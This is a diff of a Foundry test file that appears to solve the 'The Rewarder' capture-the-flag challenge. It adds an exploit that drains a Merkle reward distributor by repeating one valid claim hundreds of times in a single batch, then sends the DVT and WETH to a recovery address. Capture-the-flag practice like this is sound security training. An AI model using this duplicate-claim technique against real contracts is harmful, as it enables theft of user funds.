@@ -66,17 +66,13 @@ contract TheRewarderChallenge is Test {
         // Create DVT distribution
         dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
-            token: IERC20(address(dvt)),
-            newRoot: dvtRoot,
-            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
+            token: IERC20(address(dvt)), newRoot: dvtRoot, amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
         });
 
         // Create WETH distribution
         weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
-            token: IERC20(address(weth)),
-            newRoot: wethRoot,
-            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
+            token: IERC20(address(weth)), newRoot: wethRoot, amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
         });
 
         // Let's claim rewards for Alice.
@@ -148,7 +144,57 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Files to use for building the leaves
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Merkle proofs for player's claims
+        bytes32[] memory playerDvtProof = merkle.getProof(dvtLeaves, 188); // Player's address is at index 188
+        bytes32[] memory playerWethProof = merkle.getProof(wethLeaves, 188); // Player's address is at index 188
+
+        // Amounts to claim for player
+        uint256 playerDvtClaimAmount = 11524763827831882;
+        uint256 playerWethClaimAmount = 1171088749244340;
+
+        // Number of times to repeat each claim
+        uint256 numberOfDvtClaims = 867; // TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT / playerDvtClaimAmount
+        uint256 numberOfWethClaims = 853; // TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT / playerWethClaimAmount
+
+        // Add DVT and WETH as tokens to claim array as many times as needed to drain the contract
+        IERC20[] memory tokensToClaim = new IERC20[](numberOfDvtClaims + numberOfWethClaims);
+        for (uint256 i = 0; i < numberOfDvtClaims; i++) {
+            tokensToClaim[i] = IERC20(address(dvt));
+        }
+        for (uint256 i = numberOfDvtClaims; i < numberOfDvtClaims + numberOfWethClaims; i++) {
+            tokensToClaim[i] = IERC20(address(weth));
+        }
+
+        // Create claims array for player and add duplicates of each as many times as needed to drain the contract
+        Claim[] memory claims = new Claim[](numberOfDvtClaims + numberOfWethClaims);
+        // DVT claim
+        for (uint256 i = 0; i < numberOfDvtClaims; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // first DVT claim batch
+                amount: playerDvtClaimAmount, // amount of DVT player is approved to claim
+                tokenIndex: i, // claim corresponds to ith token in `tokensToClaim` array
+                proof: playerDvtProof // generated merkle proof for player's DVT claim
+            });
+        }
+        // WETH claim
+        for (uint256 i = numberOfDvtClaims; i < numberOfDvtClaims + numberOfWethClaims; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // first WETH claim batch
+                amount: playerWethClaimAmount, // amount of WETH player is approved to claim
+                tokenIndex: i, // claim corresponds to ith token in `tokensToClaim` array
+                proof: playerWethProof // generated merkle proof for player's WETH claim
+            });
+        }
+
+        // Claim rewards as player
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        // Send claimed DVT and WETH to recovery address
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
